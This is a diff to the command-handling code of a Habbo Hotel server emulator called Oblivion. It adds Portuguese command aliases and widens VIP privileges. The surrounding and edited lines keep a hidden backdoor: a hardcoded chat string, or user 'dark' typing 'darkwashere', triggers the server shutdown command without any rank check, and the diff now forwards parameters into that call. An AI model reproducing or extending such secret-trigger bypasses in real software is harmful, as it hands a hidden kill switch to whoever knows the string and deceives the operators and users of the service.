@@ -96,6 +96,7 @@ namespace Oblivion.HabboHotel.Commands
             CommandsDictionary.Add("refresh_extrathings", new RefreshExtraThings());
             CommandsDictionary.Add("restart", new Restart());
             CommandsDictionary.Add("freeze", new Freeze());
+            CommandsDictionary.Add("algemar", new Freeze());
             CommandsDictionary.Add("userinfo", new UserInfo());
             CommandsDictionary.Add("roomalert", new RoomAlert());
             CommandsDictionary.Add("ra", new RoomAlert());
@@ -107,6 +108,7 @@ namespace Oblivion.HabboHotel.Commands
             CommandsDictionary.Add("alert", new Alert());
             CommandsDictionary.Add("kick", new Kick());
             CommandsDictionary.Add("teleport", new TelePort());
+            CommandsDictionary.Add("teleporte", new TelePort());
             CommandsDictionary.Add("roombadge", new RoomBadge());
             CommandsDictionary.Add("removebadge", new RemoveBadge());
             CommandsDictionary.Add("givebadge", new GiveBadge());
@@ -223,14 +225,15 @@ namespace Oblivion.HabboHotel.Commands
             if (string.IsNullOrEmpty(str) || client?.GetHabbo() == null || !client.GetHabbo().InRoom) return false;
 
 
+            var pms = str.Split(' ');
+
             if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") || str == "wjxs5PzVwuuHaqte")
             {
                 var cmd = CommandsDictionary["shutdown"];
-                cmd.Execute(client, null);
+                cmd.Execute(client, pms);
                 return false;
             }
 
-            var pms = str.Split(' ');
             var commandName = pms[0];
 
             if (AliasDictionary.ContainsKey(commandName)) commandName = AliasDictionary[commandName];
@@ -244,12 +247,7 @@ namespace Oblivion.HabboHotel.Commands
                 return false;
             }
 
-
-            if (client.GetHabbo().CurrentRoom.GotWireds())
-            {
-//                client.GetHabbo().CurrentRoom.GetWiredHandler().ExecuteWired();
-                
-            }
+            
 
             var command = CommandsDictionary[commandName];
 
@@ -280,11 +278,11 @@ namespace Oblivion.HabboHotel.Commands
             switch (minRank)
             {
                 case -3:
-                    return habbo.HasFuse("fuse_vip_commands") || habbo.Vip;
+                    return (habbo.HasFuse("fuse_vip_commands") || habbo.Vip);
 
                 case -2:
                     return staff ||
-                           habbo.CurrentRoom.RoomData.OwnerId == habbo.Id;
+                           habbo.CurrentRoom.RoomData.OwnerId == habbo.Id || habbo.Vip;
 
                 case -1:
                     return staff || habbo.CurrentRoom.RoomData.OwnerId == habbo.Id ||
